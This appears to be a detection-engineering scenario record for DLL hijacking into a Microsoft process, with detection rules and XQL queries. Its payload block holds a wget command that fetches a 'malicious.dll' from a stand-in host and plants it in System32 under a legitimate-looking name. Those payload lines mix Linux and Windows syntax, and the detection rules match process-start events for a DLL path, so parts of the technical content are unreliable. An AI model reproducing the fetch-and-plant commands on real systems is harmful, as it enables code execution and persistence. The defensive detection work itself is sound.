identity.name: DLL Hijack into Microsoft Process via Malicious DLL Loading
identity.summary: An attacker places a malicious DLL in a directory that is searched by a Microsoft process, causing the process to load the malicious DLL and execute attacker code. Cortex detects this behavior through
identity.description: An attacker places a malicious DLL in a directory that is searched by a Microsoft process, causing the process to load the malicious DLL and execute attacker code. Cortex detects this behavior through process start events and file access patterns.

techniques.name: Masquerading: Match Legitimate Name or Location

payload.code:
mkdir C:\Windows\System32\temp
wget https://example.com/malicious.dll -O C:\Windows\System32\temp\legit.dll
stub chmod +x C:\Windows\System32\temp\legit.dll
stub exec C:\Windows\System32\temp\legit.dll

expected_artifacts.description: Microsoft process loading the malicious DLL
The malicious DLL placed in the system directory
C2 communication from the malicious DLL

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Suspicious DLL Load from System32
biocs.description: Detects a process loading a DLL from the Windows System32 directory that is not part of the expected Microsoft process behavior
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'C:\\Windows\\System32\\svchost.exe'
| filter action_file_path contains 'System32\\temp\\legit.dll'

abiocs.name: Unusual DLL Load Behavior
abiocs.description: Detects an unexpected DLL load behavior from a Microsoft process that is not part of normal system operation
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'C:\\Windows\\System32\\svchost.exe'
| filter action_file_path contains 'System32\\temp\\legit.dll'
| filter causality_actor_process_image_name = 'C:\\Windows\\System32\\svchost.exe'

xql_queries.name: Process Loading Suspicious DLL
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'C:\\Windows\\System32\\svchost.exe'
| filter action_file_path contains 'System32\\temp\\legit.dll'
| comp count() by actor_process_image_name, action_file_path
